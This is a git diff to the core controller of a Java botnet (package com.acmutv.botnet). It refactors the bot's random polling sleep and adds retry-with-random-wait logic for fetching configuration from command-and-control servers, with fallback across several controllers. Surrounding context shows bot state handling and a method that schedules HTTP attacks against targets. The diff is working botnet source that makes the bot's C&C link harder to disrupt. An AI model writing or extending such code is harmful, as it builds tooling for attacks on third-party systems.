@@ -28,6 +28,7 @@ package com.acmutv.botnet.core;
 
 import com.acmutv.botnet.config.AppConfiguration;
 import com.acmutv.botnet.config.AppConfigurationService;
+import com.acmutv.botnet.config.serial.AppConfigurationFormat;
 import com.acmutv.botnet.core.analysis.Analyzer;
 import com.acmutv.botnet.core.analysis.NetworkAnalyzer;
 import com.acmutv.botnet.core.analysis.SystemAnalyzer;
@@ -59,7 +60,6 @@ import java.util.ArrayList;
 import java.util.List;
 import java.util.Map;
 import java.util.concurrent.ThreadLocalRandom;
-import java.util.concurrent.TimeUnit;
 
 /**
  * This class realizes the core business logic.
@@ -156,24 +156,9 @@ public class CoreController {
       }
 
       try {
-        pollingWait();
+        waitRandom(CONTROLLER.getPolling());
       } catch (InterruptedException ignored) { }
     }
-  }
-
-  /**
-   * Make the bot sleep between polling requests.
-   * The sleep time is randomly chosen within the interval specified in {@link AppConfiguration}
-   * with the property `polling`.
-   * @throws InterruptedException when the sleeping is interrupted.
-   */
-  private static void pollingWait() throws InterruptedException {
-    final Interval pollingPeriod = AppConfigurationService.getConfigurations().getPolling();
-    final TimeUnit unit = pollingPeriod.getUnit();
-    final long amount =
-        ThreadLocalRandom.current().nextLong(pollingPeriod.getMin(), pollingPeriod.getMax());
-    LOGGER.trace("Polling wait for {} {}", amount, unit);
-    unit.sleep(amount);
   }
 
   /**
@@ -202,14 +187,21 @@ public class CoreController {
     boolean success = false;
     int controllerId = 0;
     while (!success) {
+      long failures = 0;
       Controller controller = AppConfigurationService.getConfigurations().getControllers().get(controllerId);
       final String initResource = controller.getInitResource();
       LOGGER.info("Loading bot configuration from C&C at {}...", initResource);
       try {
-        AppConfigurationService.loadJsonResource(initResource);
+        AppConfigurationService.load(AppConfigurationFormat.JSON, initResource, null);
         CONTROLLER = controller;
         success = true;
       } catch (IOException exc) {
+        failures++;
+        if (failures <= controller.getReconnections()) {
+          try {
+            waitRandom(controller.getReconnectionWait());
+          } catch (InterruptedException ignored) { }
+        }
         if (controllerId < AppConfigurationService.getConfigurations().getControllers().size()) {
           controllerId ++;
         } else {
@@ -337,7 +329,7 @@ public class CoreController {
     LOGGER.traceEntry("resource={}", resource);
     LOGGER.info("Restarting bot with resource {}...", resource);
     try {
-      AppConfigurationService.loadJsonResource(resource);
+      AppConfigurationService.load(AppConfigurationFormat.JSON, resource, null);
     } catch (IOException exc) {
       throw new BotExecutionException("Cannot restart bot. Initialization resource cannot be read. %s", exc.getMessage());
     }
@@ -410,7 +402,6 @@ public class CoreController {
     LOGGER.info("Bot killed");
     changeState(BotState.DEAD);
   }
-
 
   /**
    * Schedules a HTTP attack against the specified targets with the specified method.
@@ -507,6 +498,18 @@ public class CoreController {
   private static void changeState(BotState state) {
     LOGGER.traceEntry("state={}", state.getName());
     STATE = state;
+  }
+
+  /**
+   * Make the bot sleep for random amount within the specified period.
+   * @param period the sleeping period interval.
+   * @throws InterruptedException when the sleeping is interrupted.
+   */
+  private static void waitRandom(Interval period) throws InterruptedException {
+    final long amount =
+        ThreadLocalRandom.current().nextLong(period.getMin(), period.getMax());
+    LOGGER.trace("Waiting for {} {}", amount, period.getUnit());
+    period.getUnit().sleep(amount);
   }
 
 }
